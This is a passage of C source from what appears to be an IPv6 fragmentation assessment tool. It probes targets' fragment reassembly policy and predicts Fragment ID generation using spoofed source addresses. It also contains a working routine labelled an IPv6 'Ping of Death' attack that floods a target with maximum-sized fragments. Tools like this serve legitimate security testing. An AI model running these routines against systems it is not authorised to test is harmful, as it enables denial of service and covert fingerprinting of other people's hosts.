			if(pkt_ipv6->ip6_nxt == IPPROTO_ICMPV6){
				if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && pkt_icmp6->icmp6_type == ND_NEIGHBOR_SOLICIT){
					if( (pkt_end - (unsigned char *) pkt_ns) < sizeof(struct nd_neighbor_solicit))
						continue;
					/* 
					    If the addresses that we're using are not actually configured on the local system
					    (i.e., they are "spoofed", we must check whether it is a Neighbor Solicitation for 
					    one of our addresses, and respond with a Neighbor Advertisement. Otherwise, the kernel
					    will take care of that.
					 */
					if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && !localaddr_f && \
									is_eq_in6_addr(&(pkt_ns->nd_ns_target), &srcaddr)){
							if(send_neighbor_advert(&idata, idata.pd, pktdata) == -1){
								puts("Error sending Neighbor Advertisement");
								exit(EXIT_FAILURE);
							}
					}
				}
				else if( (pkt_icmp6->icmp6_type == ICMP6_ECHO_REPLY) || (pkt_icmp6->icmp6_type == ICMP6_TIME_EXCEEDED)){
					if( (pkt_end - (unsigned char *) pkt_icmp6) < sizeof(struct icmp6_hdr))
						continue;

					switch(pkt_icmp6->icmp6_type){
						case ICMP6_ECHO_REPLY:
							process_icmp6_echo(pkthdr, pktdata, test, &responses);
							break;

						case ICMP6_TIME_EXCEEDED:
							process_icmp6_timed(pkthdr, pktdata, test);
							break;
					}
				}
			}
		}

		for(i=0;i<5;i++){
			printf("Test #%u: ", (i+1));
			switch(test[i]){
				case FIRST_COPY:
					puts("Target preferred first copy of overlapping data");
					break;

				case LAST_COPY:
					puts("Target preferred last copy of overlapping data");
					break;

				case TIME_EXCEEDED:
					puts("Received ICMPv6 Time Exceeded error message (fragments discarded)");
					break;

				case TIMED_OUT:
					puts("Timed out (fragments discarded without notification)");
					break;

				case UNKNOWN_COPY:
					puts("Unknown pattern in response (shouldn't happen!)");
					break;
			}
		}

		exit(EXIT_SUCCESS);
	}


	/* Assess the Fragment ID generation policy */
	if(fragidp_f){
		puts("Identifying the 'Fragment ID' generation policy of the target node....");

		/*
		   Set filter for receiving Neighbor Solicitations, and fragmented ICMPv6 Echo Responses
		 */
		if(pcap_compile(idata.pd, &pcap_filter, PCAP_ICMPV6NSFRAG_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s", pcap_geterr(idata.pd));
			exit(EXIT_FAILURE);
		}
		
		if(pcap_setfilter(idata.pd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s", pcap_geterr(idata.pd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		if( (idata.fd= pcap_fileno(idata.pd)) == -1){
			puts("Error obtaining descriptor number for pcap_t");
			exit(EXIT_FAILURE);
		}

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);
		start= time(NULL);
		lastfrag1=0;		
		ntest1=0;
		ntest2=0;
		icmp6_sig= random();
		testtype= FIXED_ORIGIN;

		if(srcprefix_f){
			randprefix=srcaddr;
			randpreflen=srcpreflen;
		}
		else{
			randprefix= *src_addr_sel(&idata, &dstaddr);
			randpreflen=64;
			sanitize_ipv6_prefix(&randprefix, randpreflen);
		}

		while(1){
			curtime=time(NULL);

			if( testtype==FIXED_ORIGIN && ((curtime - start) >= ID_ASSESS_TIMEOUT || ntest1 >= NSAMPLES)){
				testtype= MULTI_ORIGIN;
				addr_sig= random();
				addr_key= random();
				start= curtime;
				continue;
			}
			else if( testtype==MULTI_ORIGIN && ((curtime - start) >= ID_ASSESS_TIMEOUT || ntest2 >= NSAMPLES)){
				break;
			}

			if((curtime - lastfrag1) >= 1){
				if(testtype == FIXED_ORIGIN){
					for(i=0; i< (NSAMPLES/NBATCHES); i++){
						if(send_fid_probe() == -1){
							puts("Error while sending packet");
							exit(EXIT_FAILURE);
						}
					}
				}
				else{
					for(i=0; i< (NSAMPLES/NBATCHES); i++){
						randomize_ipv6_addr(&srcaddr, &randprefix, randpreflen);

						/*
						 * Two words of the Source IPv6 Address are specially encoded such that we only respond
						 * to Neighbor Solicitations that target those addresses, and accept ICMPv6 Echo Replies
						 * only if they are destined to those addresses
						 */
						srcaddr.s6_addr16[5]= addr_sig;
						srcaddr.s6_addr16[7] =  srcaddr.s6_addr16[6] ^ addr_key;

						/*
						 * XXX This trick is innefective with OpenBSD. Hence we don't try to prevent the
						 * first-fragment of the response packet from being dropped.

						if(send_neighbor_solicit(&idata) == -1){
							puts("Error while sending Neighbor Solicitation");
							exit(EXIT_FAILURE);
						}
						*/

						if(send_fid_probe() == -1){
							puts("Error while sending packet");
							exit(EXIT_FAILURE);
						}
					}
				}

				lastfrag1=curtime;
				continue;
			}

			rset= sset;
			timeout.tv_usec=0;
			timeout.tv_sec= 1;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			if(sel == 0)
				continue;

			/* Read a packet (Echo Reply, or Neighbor Solicitation) */
			if((r=pcap_next_ex(idata.pd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + linkhsize);
			pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

			if( (pkt_end -  pktdata) < (linkhsize + MIN_IPV6_HLEN))
				continue;

			if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && \
							pkt_ipv6->ip6_nxt == IPPROTO_ICMPV6 && pkt_icmp6->icmp6_type == ND_NEIGHBOR_SOLICIT){
				pkt_ns= (struct nd_neighbor_solicit *) pkt_icmp6;

				if( (pkt_end - (unsigned char *) pkt_ns) < sizeof(struct nd_neighbor_solicit))
					continue;
				/* 
				    If the addresses that we're using are not actually configured on the local system
				    (i.e., they are "spoofed", we must check whether it is a Neighbor Solicitation for 
				    one of our addresses, and respond with a Neighbor Advertisement. Otherwise, the kernel
				    will take care of that.
				 */
				if(testtype==FIXED_ORIGIN){
					if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && \
							 !localaddr_f && is_eq_in6_addr(&(pkt_ns->nd_ns_target), &srcaddr)){
						if(send_neighbor_advert(&idata, idata.pd, pktdata) == -1){
							puts("Error sending Neighbor Advertisement");
							exit(EXIT_FAILURE);
						}
					}
				}
				else if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK){
					if(pkt_ns->nd_ns_target.s6_addr16[5] != addr_sig || \
						pkt_ns->nd_ns_target.s6_addr16[7] !=  (pkt_ns->nd_ns_target.s6_addr16[6] ^ addr_key))
						continue;

					if(send_neighbor_advert(&idata, idata.pd, pktdata) == -1){
						puts("Error sending Neighbor Advertisement");
						exit(EXIT_FAILURE);
					}
				}				
			}
			else if(pkt_ipv6->ip6_nxt == IPPROTO_FRAGMENT){
				if( (pkt_end - (unsigned char *) pkt_ipv6) < \
					(sizeof(struct ip6_hdr) + sizeof(struct ip6_frag) + sizeof(struct icmp6_hdr) + sizeof(u_int32_t)))
					continue;

				pkt_fh= (struct ip6_frag *) ( (unsigned char *)pkt_ipv6 + sizeof(struct ip6_hdr));

				if(pkt_fh->ip6f_nxt != IPPROTO_ICMPV6)
					continue;

				/* XXX We only sample non-first fragments (see below) */
				if(!(pkt_fh->ip6f_offlg & IP6F_OFF_MASK))
					continue;

				/*
				 * XXX These checks were removed, since when assessing some implementations on a local
				 * network, we never get the first fragment because it is discarded when it triggers ND.
				 */
				if(!(pkt_fh->ip6f_offlg & IP6F_OFF_MASK)){
					pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *)pkt_fh + sizeof(struct ip6_frag));

					if(pkt_icmp6->icmp6_type != ICMP6_ECHO_REPLY)
						continue;

					if(ntohs(pkt_icmp6->icmp6_data16[0]) != getpid() )
						continue;
				}

				if(testtype==FIXED_ORIGIN){
					if(!is_eq_in6_addr(&(pkt_ipv6->ip6_dst), &srcaddr)){
						continue;
					}

					/* XXX Not used when sampling non-first fragments */
					if(!(pkt_fh->ip6f_offlg & IP6F_OFF_MASK)){
						if( *(u_int32_t *)((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr)) != icmp6_sig){
							continue;
						}
					}

					if(ntest1 >= NSAMPLES)
						continue;

					test1[ntest1]= ntohl(pkt_fh->ip6f_ident);
					ntest1++;
				}
				else{
					if(pkt_ipv6->ip6_dst.s6_addr16[5] != addr_sig || \
						pkt_ipv6->ip6_dst.s6_addr16[7] !=  (pkt_ipv6->ip6_dst.s6_addr16[6] ^ addr_key)){
						continue;
					}

					/* XXX Not used when sampling non-first fragments */
					if(!(pkt_fh->ip6f_offlg & IP6F_OFF_MASK)){
						if( *(u_int32_t *)((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr)) != icmp6_sig){
							continue;
						}
					}

					if(ntest2 >= NSAMPLES)
						continue;

					test2[ntest2]= ntohl(pkt_fh->ip6f_ident);
					ntest2++;
				}
			}
		}

		if(verbose_f > 1){
			printf("Sampled %u Fragment Identifications from single-origin probes\n", ntest1);

			for(i=0; i<ntest1; i++)
				printf("#%02u: %08x\n", (i+1), test1[i]);

			printf("\nSampled %u Fragment Identifications from multi-origin probes\n", ntest2);

			for(i=0; i<ntest2; i++)
				printf("#%02u: %08x\n", (i+1), test2[i]);

			puts("");
		}

		if(ntest1 < 10 || ntest2 < 10){
			puts("Error: Didn't receive enough response packets");
			exit(EXIT_FAILURE);
		}

		if(predict_frag_id(test1, ntest1, test2, ntest2) == -1){
			puts("Error in predict_frag_id()");
			exit(EXIT_FAILURE);
		}

		exit(EXIT_SUCCESS);
	}


	/* Perform an IPv6-version of the "Ping of Death" attack */
	if(pod_f){
		puts("Performing a 'ping of death' attack against the target node....");

		/*
		   Set filter for receiving Neighbor Solicitations, ICMPv6 Echo Responses, and ICMPv6 Time Exceeded
		 */
		if(pcap_compile(idata.pd, &pcap_filter, PCAP_ICMPV6_NSECHOEXCEEDED_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s", pcap_geterr(idata.pd));
			exit(EXIT_FAILURE);
		}
		
		if(pcap_setfilter(idata.pd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s", pcap_geterr(idata.pd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		maxsizedchunk= idata.mtu - sizeof(struct ip6_hdr) - sizeof(struct ip6_frag);
		id=random();
		foffset=0;
		i=0;

		/* We send maximum-sized fragments to cover the entire offset space */
		while((foffset+maxsizedchunk) < MAX_FRAG_OFFSET){
			if(send_fragment(id, foffset, maxsizedchunk, foffset?MIDDLE_FRAGMENT:FIRST_FRAGMENT, NO_TIMESTAMP) == -1){
				puts("Error when writing fragment");
				exit(EXIT_FAILURE);
			}

			foffset+= maxsizedchunk;
			i++;

			/* Pause for 1 second every 8 packets */
			if(!(i%8))
				sleep(1);
		}

		/*
		   We send another fragment to close the gap with the last fragment and a fragment with
		   offset 0xfff8
		 */
		if(foffset != MAX_FRAG_OFFSET){
			if(send_fragment(id, foffset, (idata.mtu-maxsizedchunk)/8, MIDDLE_FRAGMENT, NO_TIMESTAMP) == -1){
				puts("Error when writing fragment");
				exit(EXIT_FAILURE);
			}

			foffset+=(idata.mtu-maxsizedchunk)/8;	
		}

		/* Send a last fragment, at the right edge, with the maximum possible size */
		if(send_fragment(id, foffset, idata.mtu-sizeof(struct ip6_hdr)-sizeof(struct ip6_frag), \
						LAST_FRAGMENT, NO_TIMESTAMP) == -1){
			puts("Error when writing fragment");
			exit(EXIT_FAILURE);
		}

		exit(EXIT_SUCCESS);
	}

	/* Send fragments to a target destination */
	if(dstaddr_f){
		/*
		   Set filter for receiving Neighbor Solicitations, ICMPv6 Echo Responses, and ICMPv6 Time Exceeded
		 */
		if(pcap_compile(idata.pd, &pcap_filter, PCAP_ICMPV6_NSECHOEXCEEDED_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
			printf("pcap_compile(): %s", pcap_geterr(idata.pd));
			exit(EXIT_FAILURE);
		}
		
		if(pcap_setfilter(idata.pd, &pcap_filter) == -1){
			printf("pcap_setfilter(): %s", pcap_geterr(idata.pd));
			exit(EXIT_FAILURE);
		}

		pcap_freecode(&pcap_filter);

		if( (idata.fd= pcap_fileno(idata.pd)) == -1){
			puts("Error obtaining descriptor number for pcap_t");
			exit(EXIT_FAILURE);
		}

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);
		lastfrag=0;
		start= time(NULL); 

		while(1){
			curtime=time(NULL);

			if(!loop_f && ((curtime - start) >= QUERY_TIMEOUT || (!resp_f && lastfrag != 0))){
				break;
			}

			if((curtime - lastfrag) >= nsleep){
				puts("Sending Fragment(s)....");

				frags=0;

				if(!foffset_f){
					foffset= random();
				}

				if(forder != LAST_FRAGMENT){
					foffset= (foffset >> 3) << 3;
				}

				while(frags < nfrags){
					if(send_fragment(fid_f?fid:random(), foffset, fsize_f?fsize:( ((MIN_FRAG_SIZE+(random()%400))>>3)<<3), \
						forder, tstamp_f) == -1){

						puts("Error sending packet");
						exit(EXIT_FAILURE);
					}

					frags++;
				}

				lastfrag=curtime;
				continue;
			}

			rset= sset;
			timeout.tv_usec=0;
			timeout.tv_sec= (lastfrag+nsleep)-curtime;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, &timeout)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			if(sel == 0)
				continue;

			/* Read a packet (Echo Reply, ICMPv6 Error, or Neighbor Solicitation) */
			if((r=pcap_next_ex(idata.pd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + linkhsize);
			pkt_icmp6 = (struct icmp6_hdr *) ((char *) pkt_ipv6 + sizeof(struct ip6_hdr));
			pkt_ns= (struct nd_neighbor_solicit *) pkt_icmp6;
			pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

			if( (pkt_end -  pktdata) < (linkhsize + MIN_IPV6_HLEN))
				continue;

			if(pkt_ipv6->ip6_nxt == IPPROTO_ICMPV6){
				if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && pkt_icmp6->icmp6_type == ND_NEIGHBOR_SOLICIT){
					if( (pkt_end - (unsigned char *) pkt_ns) < sizeof(struct nd_neighbor_solicit))
						continue;
					/* 
					    If the addresses that we're using are not actually configured on the local system
					    (i.e., they are "spoofed", we must check whether it is a Neighbor Solicitation for 
					    one of our addresses, and respond with a Neighbor Advertisement. Otherwise, the kernel
					    will take care of that.
					 */
					if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK && !localaddr_f && \
									is_eq_in6_addr(&(pkt_ns->nd_ns_target), &srcaddr)){
							if(send_neighbor_advert(&idata, idata.pd, pktdata) == -1){
								puts("Error sending Neighbor Advertisement");
								exit(EXIT_FAILURE);
							}
					}
				}
				else if( (pkt_icmp6->icmp6_type == ICMP6_ECHO_REPLY) || (pkt_icmp6->icmp6_type == ICMP6_TIME_EXCEEDED)){
					if( (pkt_end - (unsigned char *) pkt_icmp6) < sizeof(struct icmp6_hdr))
						continue;
					/*
					   Do a preliminar validation check on the ICMPv6 packet (packet size, Source Address,
					   and Destination Address).
					 */
					if(!valid_icmp6_response(&idata, pkthdr, pktdata)){
						continue;
					}

					switch(pkt_icmp6->icmp6_type){
						case ICMP6_ECHO_REPLY:
							if(resp_f)
								print_icmp6_echo(pkthdr, pktdata);

							break;

						case ICMP6_TIME_EXCEEDED:
							if(resp_f)
								print_icmp6_timed(pkthdr, pktdata);

							break;
					}
				}
			}
		}
		
		exit(EXIT_SUCCESS);
	}

	exit(EXIT_SUCCESS);
}


/*
 * Function: print_icmp6_info()
 *
 * Print information about a received ICMPv6 Echo Response packet
 */
void print_icmp6_echo(struct pcap_pkthdr *pkthdr, const u_char *pktdata){
	struct ip6_hdr		*pkt_ipv6;
	time_t				rtt;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + linkhsize);

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	rtt= time(NULL) - *(time_t *) ( (unsigned char *) pkt_ipv6 + (sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)));
	printf("ICMPv6 echo Reply from %s", pv6addr);
	if(rtt > 0)
		printf(" (RTT: %u second%s)\n", (u_int32_t)rtt, (rtt>1)?"s":"");
	else
		puts(" (RTT: < 1 second)"); 
}


/*
 * Function: print_icmp6_timed()
 *
 * Print information about a received ICMPv6 Time Exceeded error message
 */
void print_icmp6_timed(struct pcap_pkthdr *pkthdr, const u_char *pktdata){
	struct ip6_hdr		*pkt_ipv6, *pkt_ipv6_ipv6;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	struct ip6_ext		*pkt_ext;
	struct ip6_frag		*pkt_fh_fh;
	u_int8_t			pkt_prev_nh;
	time_t				rtt;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + linkhsize);
	pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_ipv6 + sizeof(struct ip6_hdr));
	pkt_ipv6_ipv6= (struct ip6_hdr *) ((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr));
	pkt_fh_fh= NULL;
	pkt_ext= (struct ip6_ext *) ((unsigned char *)pkt_ipv6_ipv6 + sizeof(struct ip6_hdr));
	pkt_prev_nh= (pkt_ipv6_ipv6->ip6_nxt);

	while(pkt_prev_nh != IPPROTO_ICMPV6 && \
		( (unsigned char *)pkt_ext + (pkt_ext->ip6e_len * 8 + 1)) < pkt_end){

		if(pkt_prev_nh == IPPROTO_FRAGMENT)
			pkt_fh_fh= (struct ip6_frag *) pkt_ext;

		pkt_prev_nh= pkt_ext->ip6e_nxt;
		pkt_ext= (struct ip6_ext *) ( (unsigned char *)pkt_ext + ((pkt_ext->ip6e_len + 1) * 8));
	}

	if(pkt_prev_nh == IPPROTO_ICMPV6){
		pkt_icmp6_icmp6= (struct icmp6_hdr *) pkt_ext;

		if( ((unsigned char *) pkt_icmp6_icmp6 + (sizeof(struct icmp6_hdr)+ sizeof(struct ip6_hdr)+ \
				sizeof(struct ip6_frag)+sizeof(struct icmp6_hdr))) > pkt_end)
			return;
	}
	else{
		return;
	}

	if(pkt_fh_fh == NULL)
		return;

	/*
	 * We can only check the embedded ICMPv6 header if the embedded fragment is the first fragment of
	 * a packet
	 */
	if(ntohs(pkt_fh_fh->ip6f_offlg & IP6F_OFF_MASK) == 0){ 
		if(pkt_icmp6_icmp6->icmp6_type != ICMP6_ECHO_REQUEST){
			return;
		}

		if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
			return;
		}
	}
	else{
		return;
	}

	if(inet_ntop(AF_INET6, &(pkt_ipv6->ip6_src), pv6addr, sizeof(pv6addr)) == NULL){
		puts("inet_ntop(): Error converting IPv6 Source Address to presentation format");
		exit(EXIT_FAILURE);
	}

	if(tstamp_f){
		pkt_ptr= ((unsigned char *) pkt_icmp6_icmp6+ sizeof(struct icmp6_hdr));

		/* Verify our "checksum" */
		if(*(u_int32_t *)(pkt_ptr+sizeof(time_t)) != ((*(u_int32_t *)pkt_ptr) ^ 0xabcdabcd)){
			return;
		}

		rtt= time(NULL) - *(time_t *) pkt_ptr;

		printf("Response from %s: ICMPv6 Time Exceeded error message (Reassembly timeout: %lu seconds)\n", pv6addr, \
					(LUI) rtt);
	}
	else
		printf("Response from %s: ICMPv6 Time Exceeded error message\n", pv6addr);
}



/*
 * Function: process_icmp6_echoinfo()
 *
 * Process ICMPv6 echo reply messages received in response to our probe packets that investigate
 * the fragment reassembly policy of a target
 */
void process_icmp6_echo(struct pcap_pkthdr *pkthdr, const u_char *pktdata, unsigned char *test, unsigned int *responses){
	struct ip6_hdr		*pkt_ipv6;
	struct icmp6_hdr	*pkt_icmp6;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + linkhsize);
	pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_ipv6 + sizeof(struct ip6_hdr));

	if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block1)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize*2-overlap)){
			return;
		}

		if(test_frag_pattern( (unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr) + minfragsize-overlap), \
								overlap, block1)){
			test[0]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize-overlap), \
				overlap, block6)){
			test[0]= LAST_COPY;
		}
		else{
			test[0]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block2)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize * 3-overlap)){
			return;
		}

		if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize-overlap), overlap, block2)){
			test[1]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize-overlap), \
				overlap, block7)){
			test[1]= LAST_COPY;
		}
		else{
			test[1]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block3)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize * 3-overlap)){
			return;
		}

		if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2-overlap),\
							 overlap, block6)){
			test[2]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2-overlap), \
				overlap, block7)){
			test[2]= LAST_COPY;
		}
		else{
			test[2]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block4)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize * 4)){
			return;
		}

		if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2), \
							minfragsize, block6)){
			test[3]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2), \
					minfragsize, block7)){
			test[3]= LAST_COPY;
		}
		else{
			test[3]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block5)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + \
				sizeof(struct icmp6_hdr)+minfragsize * 4 - overlap)){
			return;
		}

		if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2), \
				minfragsize, block6)){
			test[4]= FIRST_COPY;
		}
		else if(test_frag_pattern((unsigned char *)pkt_icmp6+(sizeof(struct icmp6_hdr)+minfragsize * 2), \
				minfragsize, block7)){
			test[4]= LAST_COPY;
		}
		else{
			test[4]= UNKNOWN_COPY;
		}

		(*responses)++;
	}
	else{
		if(verbose_f)
			puts("ICMPv6 Echo Reply for unknown probe type");
	}

}


/*
 * Function: process_icmp6_timed()
 *
 * Process ICMPv6 Time Exceeded messages received in response to our probe packets that investigate
 * the fragment reassembly policy of a target
 */
void process_icmp6_timed(struct pcap_pkthdr *pkthdr, const u_char *pktdata, unsigned char *test){
	struct ip6_hdr		*pkt_ipv6, *pkt_ipv6_ipv6;
	struct icmp6_hdr	*pkt_icmp6, *pkt_icmp6_icmp6;
	struct ip6_ext		*pkt_ext;
	struct ip6_frag		*pkt_fh_fh;
	u_int8_t			pkt_prev_nh;

	pkt_ipv6 = (struct ip6_hdr *) (pktdata + linkhsize);
	pkt_icmp6= (struct icmp6_hdr *) ((unsigned char *) pkt_ipv6 + sizeof(struct ip6_hdr));
	pkt_ipv6_ipv6= (struct ip6_hdr *) ((unsigned char *)pkt_icmp6+ sizeof(struct icmp6_hdr));
	pkt_fh_fh= NULL;
	pkt_ext= (struct ip6_ext *) ((unsigned char *)pkt_ipv6_ipv6 + sizeof(struct ip6_hdr));
	pkt_prev_nh= (pkt_ipv6_ipv6->ip6_nxt);

	while(pkt_prev_nh != IPPROTO_ICMPV6 && \
		( (unsigned char *)pkt_ext + (pkt_ext->ip6e_len * 8 + 1)) < pkt_end){

		if(pkt_prev_nh == IPPROTO_FRAGMENT)
			pkt_fh_fh= (struct ip6_frag *) pkt_ext;

		pkt_prev_nh= pkt_ext->ip6e_nxt;
		pkt_ext= (struct ip6_ext *) ( (unsigned char *)pkt_ext + ((pkt_ext->ip6e_len + 1) * 8));
	}

	if(pkt_prev_nh == IPPROTO_ICMPV6){
		pkt_icmp6_icmp6= (struct icmp6_hdr *) pkt_ext;

		if( ((unsigned char *) pkt_icmp6_icmp6 + (sizeof(struct icmp6_hdr)+ sizeof(struct ip6_hdr)+ \
				sizeof(struct ip6_frag)+sizeof(struct icmp6_hdr))) > pkt_end)
			return;
	}
	else{
		return;
	}

	if(pkt_fh_fh == NULL)
		return;

	/*
	 * We can only check the embedded ICMPv6 header if the embedded fragment is the first fragment of
	 * a packet
	 */
	if(ntohs(pkt_fh_fh->ip6f_offlg & IP6F_OFF_MASK) == 0){ 
		if(pkt_icmp6_icmp6->icmp6_type != ICMP6_ECHO_REQUEST){
			return;
		}

		if(pkt_icmp6_icmp6->icmp6_data16[0] != htons(getpid())){
			return;
		}
	}
	else{
		return;
	}

	if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block1)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){

			return;
		}
		else{
			test[0]= TIME_EXCEEDED;
		}

	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block2)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){
			return;
		}

		test[1]= TIME_EXCEEDED;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block3)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){
			return;
		}

		test[2]= TIME_EXCEEDED;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block4)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){
			return;
		}

		test[3]= TIME_EXCEEDED;
	}
	else if(test_frag_pattern( ((unsigned char *) pkt_icmp6_icmp6 + sizeof(struct icmp6_hdr)), FRAG_BLOCK_SIZE, block5)){
		if(!valid_icmp6_response2(&idata, pkthdr, pktdata, sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr) + \
				sizeof(struct ip6_frag) + sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr)+minfragsize)){
			return;
		}

		test[4]= TIME_EXCEEDED;
	}
	else{
		test[4]= UNKNOWN_COPY;
	}

}


/*
 * Function: send_fragment2()
 *
 * Sends an IPv6 for evaluating the fragment reassembly policy
 */
int send_fragment2(u_int16_t ip6len, unsigned int id, unsigned int offset, unsigned int fsize, unsigned int order, \
						char *block){
	unsigned char	*ptrend;

	ethernet= (struct ether_header *) buffer;
	dlt_null= (struct dlt_null *) buffer;
	v6buffer = buffer + linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;
	fsize= (fsize>>3) << 3;

	if(idata.type == DLT_EN10MB && idata.type != IFACE_LOOPBACK){
		ethernet->src = hsrcaddr;
		ethernet->dst = hdstaddr;
		ethernet->ether_type = htons(0x86dd);
	}
	else if(idata.type == DLT_NULL){
		dlt_null->family= PF_INET6;
